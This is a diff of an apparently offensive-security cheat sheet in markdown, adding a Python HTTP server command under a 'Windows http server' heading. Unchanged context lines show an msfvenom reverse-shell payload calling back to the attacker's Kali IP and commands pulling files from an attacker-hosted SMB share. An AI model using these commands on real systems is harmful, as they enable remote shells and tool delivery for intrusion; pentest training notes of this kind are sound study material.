@@ -36,6 +36,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you d
 smbserver.py -smb2support Share .
 cmd.exe /c //<your kali IP>/Share/<file name you want>
 ````
+### Windows http server
+````
+python3 -m http.server 80
+````
 ## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
 
 ## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
